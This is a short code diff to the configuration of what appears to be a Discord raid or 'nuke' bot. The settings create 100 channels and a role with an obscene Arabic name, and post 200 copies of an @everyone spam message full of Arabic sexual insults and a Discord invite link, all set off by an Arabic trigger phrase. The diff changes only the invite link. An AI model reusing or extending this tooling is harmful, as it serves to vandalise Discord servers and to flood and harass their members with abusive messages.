@@ -9,7 +9,7 @@ let config = {
     channelCount: 100,
     roleName: "نيك",
     iconPath: "./icon.png",
-    spamMessage: "@everyone اعمامك هنا يا قحبه انت وياه https://discord.gg/6j5PVZqgBy",
+    spamMessage: "@everyone اعمامك هنا يا قحبه انت وياه https://discord.gg/Eqf5tCGe2T",
     spamCount: 200,
     triggerWord: "شغل يا ريس"
 };
